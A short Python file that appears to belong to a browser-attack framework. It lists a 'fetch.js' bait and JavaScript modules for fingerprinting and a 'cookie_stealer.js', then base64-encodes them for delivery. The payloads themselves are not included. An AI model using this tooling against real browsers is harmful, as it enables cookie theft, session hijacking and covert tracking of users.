from enum import Enum
import base64
import pathlib

MODULES_PATH = "\\modules"
BAITS_PATH = "\\baits"

class Parser:
    @classmethod
    def b64_encode(cls, path):
        with open(path, "rb") as text:
            encoded_text = base64.b64encode(text.read()).decode()

        return encoded_text


class Bait(Enum):
    FETCH = "fetch.js"

    @classmethod
    def b64_encode(cls, bait: str):
        return Parser.b64_encode(f"{pathlib.Path(__file__).parent.resolve()}\\{BAITS_PATH}\\{bait}")

class Module(Enum):
    BROWSER_PLUGINS = 'browser_plugins.js'
    TIMEZONE = 'timezone.js'
    LANGUAGE = 'language.js'
    SCREEN_RESOLUTION = 'screen_resolution.js'
    COOKIE_STEALER = 'cookie_stealer.js'

    @classmethod
    def has_value(cls, value):
        return value in cls._value2member_map_ 
    
    @classmethod
    def b64_encode(cls, module: str):
        return Parser.b64_encode(f"{pathlib.Path(__file__).parent.resolve()}\\{MODULES_PATH}\\{module}")

